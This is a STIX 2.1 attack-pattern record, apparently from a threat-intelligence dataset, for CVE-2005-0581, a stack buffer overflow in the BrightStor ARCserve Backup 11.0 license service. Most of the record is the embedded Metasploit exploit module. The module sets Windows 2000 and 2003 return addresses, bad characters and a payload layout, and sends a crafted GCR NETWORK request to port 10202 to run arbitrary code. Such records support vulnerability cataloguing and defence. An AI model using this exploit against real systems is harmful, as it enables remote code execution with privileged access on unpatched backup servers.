{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b06b99bb-12c1-4c0c-a79e-9b753742c203",
    "created": "2024-08-14T16:48:13.913939Z",
    "modified": "2024-08-14T16:48:13.913943Z",
    "name": "CA BrightStor ARCserve License Service GCR NETWORK Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Computer Associates BrightStor ARCserve Backup 11.0. By sending a specially crafted request to the lic98rmtd.exe service, an attacker could overflow the buffer and execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/brightstor/license_gcr.rb",
            "external_id": "license_gcr.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-0581"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'CA BrightStor ARCserve License Service GCR NETWORK Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Computer Associates BrightStor ARCserve Backup 11.0.\n        By sending a specially crafted request to the lic98rmtd.exe service, an attacker\n        could overflow the buffer and execute arbitrary code.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-0581' ],\n          [ 'OSVDB', '14389' ],\n          [ 'BID', '12705' ],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 500,\n          'BadChars' => \"\\x00\\x09\\x0a\\x0d\\x20\\x0c\\x25\\x26\\x27\\x0b\\x2b\\x2f\\x3a\\x3c\\x3e\\x3f\\x40\",\n          'StackAdjustment' => -3500,\n          'PrependEncoder' => \"\\x81\\xc4\\xff\\xef\\xff\\xff\\x44\",\n        },\n      'Platform' => 'win',\n      'Targets'  =>\n          [\n            [ 'Windows 2003 SP0 English',     { 'Ret' => 0x71ae1f9b } ], # JMP ESP wshtcpip.dll\n            [ 'Windows 2000 SP4 English',     { 'Ret' => 0x7c30d043 } ], # JMP ESP advapi32.dll\n          ],\n      'DisclosureDate' => '2005-03-02',\n      'DefaultTarget' => 0))\n\n    register_options([ Opt::RPORT(10202) ])\n  end\n\n  def exploit\n    connect\n\n    buff =  rand_text_alpha_upper(256) + [target.ret].pack('V')\n    buff << make_nops(12) + payload.encoded\n\n    # NETWORK<x.x.x.x buff x.x.x.x.x> ... worked for me.\n    sploit  = \"A0 GCR NETWORK<#{buff}>RMTV<1.00><EOM>\"\n\n    print_status(\"Trying target #{target.name}...\")\n\n    sock.put(sploit)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-03-02",
    "x_mitre_platforms": [
        "win'"
    ]
}